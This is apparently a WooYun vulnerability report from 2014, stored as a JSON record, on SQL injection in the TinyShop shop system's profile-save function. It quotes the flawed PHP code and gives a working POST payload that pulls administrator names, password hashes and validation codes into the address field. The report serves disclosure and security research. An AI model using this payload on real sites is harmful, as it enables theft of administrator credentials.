{"id": 51678, "wybug_id": "wooyun-2014-073725", "wybug_title": "TinyShop SQL注入2", "wybug_corp": "tinyrise.com", "wybug_author": "zxx", "wybug_date": "2014-08-26 12:29", "wybug_open_date": "2014-11-21 12:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-31：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向公众公开  简要描述： 参数未过滤，导致注入 详细说明：  问题出现在/protected/controllers/ucenter.php中：\npublic function info_save()    {        $rules = array('name:required:昵称不能为空!','real_name:required:真实姓名不能为空!','sex:int:性别必需选择！','birthday:date:生日日期格式不正确！','mobile:mobi:手机格式不正确','phone:phone:电话格式不正确');        $info = Validator::check($rules);        if(is_array($info)){            $this->redirect(\"info\",false,array('msg'=>array(\"info\",$info['msg'])));        }else{            $data = array(                    'name'=>Filter::str(Req::args('name')),                    'real_name'=>Filter::str(Req::args('real_name')),                    'sex'=>Filter::int(Req::args('sex')),                    'birthday'=>Req::args('birthday'),                    'mobile'=>Req::args('mobile'),                    'phone'=>Req::args('phone'),                    'province'=>Req::args('province'),                    'city'=>Req::args('city'),                    'county'=>Req::args('county'),                    'addr'=>Filter::text(Req::args('addr'))//上面几个参数都没有过滤，直接赋值了，但是Validator::check($rules)函数会队一些参数做验证，看看addr吧，用Filter::text函数过滤了，我们跟一下                );        }        $name = Filter::sql(Req::args(\"name\"));        $id = $this->user['id'];        $this->model->table(\"user\")->data(array(\"name\"=>$name))->where(\"id=$id\")->update();        $this->model->table(\"customer\")->data($data)->where(\"user_id=$id\")->update();。。。    }\n我们跟一下Filter::text：\n/**@param $str 字符串\t* @return 字符串\t*@note 处理HTML编辑器的内容，主要是解决JavaScript的注入问题\t*/\t\tpublic static function text($str)\t{\t\t$config = HTMLPurifier_Config::createDefault();\t    $cache_dir=Tiny::getPath('cache').\"/htmlpurifier/\";\t\tif(!file_exists($cache_dir))\t\t{\t\t\tFile::mkdir($cache_dir);\t\t}\t\t$config = HTMLPurifier_Config::createDefault();\t\t//配置 缓存目录\t\t$config->set('Cache.SerializerPath',$cache_dir); //设置cache目录\t\t\t\t\t//配置 允许flash\t\t$config->set('HTML.SafeEmbed',true);\t\t$config->set('HTML.SafeObject',true);\t\t$config->set('Output.FlashCompat',true);\t\t//$config->set('HTML.Allowed', 'p');\t\t//$config->set('AutoFormat.AutoParagraph', true);\t\t//$config->set('AutoFormat.RemoveEmpty', true);\t\t//允许<a>的target属性\t\t$def = $config->getHTMLDefinition(true);\t\t$def->addAttribute('a', 'target', 'Enum#_blank,_self,_target,_top');\t\t\t\t$purifier = new HTMLPurifier($config);\t\tif (get_magic_quotes_gpc())$str = stripslashes($str);\t\t$str = $purifier->purify($str);\t    return  $str;\t}\n跟进发现text函数并没有对sql注入进行过滤，问题就出现了。   漏洞证明：  http://localhost/index.php?con=ucenter&act=info_savePOST内容：name=test@qq.com&real_name=test&sex=1&birthday=2014-08-29&mobile=13712345678&phone=3123123&province=130000&city=130200&county=130202&addr=11111231231,`addr`=(select concat(name,0x5f,password,0x5f,validcode) from tiny_manager) #看看sql执行：\n\n然后我们点击自己的个人资料：\n\n管理员的账号，密码hash和验证码都有了   修复方案：  过滤一下   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-21 12:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}